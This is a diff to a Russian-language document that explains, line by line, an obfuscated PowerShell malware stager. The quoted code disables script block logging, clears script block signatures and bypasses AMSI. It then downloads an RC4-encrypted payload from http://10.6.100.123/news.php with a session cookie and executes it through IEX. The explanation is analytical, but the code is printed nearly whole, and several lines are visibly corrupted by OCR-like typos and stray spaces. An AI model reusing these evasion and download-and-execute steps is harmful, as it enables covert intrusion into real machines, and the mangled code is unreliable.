@@ -1572,55 +1572,77 @@ ___
 
 IF ($PSVersionTAbLE.PSVErsiON.MaJor-ge3) {
 Эта строка проверяет версию PowerShell. $PSVersionTable - это автоматическая переменная, содержащая информацию о версии PowerShell. Условие проверяет, является ли основная (Major) версия PowerShell 3 или выше. Если да, выполняется код внутри блока.
+
 $GPF=[REF].AsSemBLY.GETTyPE('System.Management.Automation.Utils')."GETFiel d"('cachedGroupPolicySettings',"N'+'onPublic,Static');
 Эта строка использует рефлексию для доступа к скрытому статическому полю 'cachedGroupPolicySettings' в классе System.Management.Automation.Utils. [REF] - это сокращение для System.Reflection.Assembly. Метод GetField используется для получения информации о поле, которое является непубличным (NonPublic) и статическим (Static).
+
 If ($GPF) {
 Проверяет, успешно ли получено поле в предыдущей строке. Если $GPF не null, выполняется код внутри блока.
+
 $GPC=$GPF.GEtVaLue($NULL);
 Получает значение поля cachedGroupPolicySettings. $NULL передается как параметр, так как это статическое поле и не требует экземпляра объекта.
+
 IF ($GPC['ScriptB'+'lockLogging]) {
 Проверяет, существует ли ключ 'ScriptBlockLogging' в полученных настройках групповой политики. Строка разделена на части для усложнения обнаружения.
+
 $GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;
 $GPC['ScriptB'+'lockLogging']['EnableScriptBlockinvocationLogging']=0 }
 Эти строки отключают логирование блокировки скриптов и логирование вызовов скриптовых блоков, устанавливая соответствующие значения в 0.
+
 $vAl=[CoLLeCtionS.GENEric.DICtiONARy[striNg,SYstEm.ObjECT]]::nEw();
 Создает новый экземпляр словаря (Dictionary), который будет использоваться для хранения настроек. Ключи - строки, значения - объекты.
+
 $Val.ADd('EnableScriptB'+'lockLogging',0);
 $VAL.AdD('EnableScriptBlockinvocationLogging',0);
 Добавляет в созданный словарь два ключа, оба со значением 0, что соответствует отключению логирования.
+
 $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShelllS criptB'+'lockLogging']=$VAI
 Применяет новые настройки, добавляя их в кэш групповой политики для указанного пути реестра.
+
 } ELSe
 [ScriPtBLocK]."GETFieLd"("signatures",'NonPublic,Static').SEtValuE($NULL,(New-OBj eCtColLEctIONs.GENERic.HaShSEt[sTrING]))
 Если предыдущие действия не удались, этот код очищает подписи скриптовых блоков, устанавливая для поля "signatures" пустой HashSet.
+
 [ReF].AsSembLY.GetTYpE('System.Management.Automation.AmsiUtils")?{S_)
 %(
 $_.GetFleID('amsilnitFailed',"NonPublic,Static').SeTValUe($NULL,$True)};
 Эти строки пытаются отключить AMSI (Antimalware Scan Interface), устанавливая флаг 'amsiInitFailed' в значение True. Это может позволить обойти антивирусное сканирование.
+
 [ SysteM.NEt .SERvICePolnTMANAgeR]::ExPEcT100COntinUe=0;
 Отключает ожидание ответа 100-Continue от сервера при HTTP-запросах.
+
 $WC= New-ObJECtSYstEm.NEt .WEBCLieNT;
 Создает новый объект WebClient для выполнения веб-запросов.
+
 Su='Mozilla/5.0(WindowsNT6.1;WOW64;Trident/7.0;rv:11.0)likeGecko';
 $wc.HeAdErS.ADD('User-Agent',Su);
 Устанавливает пользовательский User-Agent для веб-клиента, маскируясь под Internet Explorer 11.
+
 $Wc.PRoXY=[ SYstem.NEt .WEbRequESt]::DEfAulTWeBProxY;
 $wC.ProxY.CRedENTiAls=[ SysTEM.NEt .CrEDeNTialCaCHE]::DEFAULtNeTworKCrEd EnTiaLs;
 Настраивает прокси-сервер для веб-клиента, используя системные настройки прокси и учетные данные по умолчанию.
+
 $Script:Proxy=$wc.Proxy;
 Сохраняет настройки прокси в глобальную переменную скрипта для возможного дальнейшего использования.
+
 $K=[SYsTEM.Text.ENcodiNg]::ASCII.GETBYtES('99754106633f94d350db34d548d609 1a");
 Создает массив байтов из заданной строки, который будет использоваться как ключ для шифрования/дешифрования.
+
 $R={...};
 Определяет анонимную функцию (лямбда-выражение) для реализации алгоритма дешифрования (предположительно RC4).
+
 $ser='http://10.6.100.123:80'; $t="/news.p hp';
 Устанавливает адрес сервера и путь для загрузки дополнительных данных.
+
 $WC.HeadERS.AdD("Cookie","session=8xD4koAuu7qHah4KQzwZ/kDq40c=");
 Добавляет куки к запросу, возможно, для аутентификации на удаленном сервере.
+
 $DAtA=$WC.DoWNloaDDAtA($SER+$T);
 Загружает данные с указанного URL.
+
 $IV=$DatA[0…3]; $datA=$DATa[4…$datA.lengT H];
 Извлекает первые 4 байта как вектор инициализации (IV) и остальные данные как зашифрованное содержимое.
+
 -join[ChAr[]](&$R$daTA($IV+$K))|IEX
 Расшифровывает данные с помощью функции $R, преобразует результат в строку и выполняет его как PowerShell-код с помощью оператора IEX (Invoke-Expression).
 
